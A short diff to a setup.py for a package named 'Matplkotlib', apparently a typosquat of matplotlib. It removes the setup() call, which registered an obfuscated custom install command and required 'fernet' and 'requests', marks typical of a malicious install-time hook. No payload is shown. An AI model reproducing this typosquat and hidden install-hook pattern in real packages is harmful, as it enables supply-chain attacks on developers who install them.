@@ -18,22 +18,5 @@ class ialFOqPipkxaprBeNHbFEkArQftMPDTKDgEOzCIjmGyUcshVczePEuMjJqbZgRUTyjmPidpIRK
             install.run(self)
 
 
-setup(
-    name="Matplkotlib",
-    version=VERSION,
-    author="YiRNtYKCJ",
-    author_email="jAfjdAl@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': ialFOqPipkxaprBeNHbFEkArQftMPDTKDgEOzCIjmGyUcshVczePEuMjJqbZgRUTyjmPidpIRKKRswhhGlPkaYuehZBcnxkvaDbB,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
 
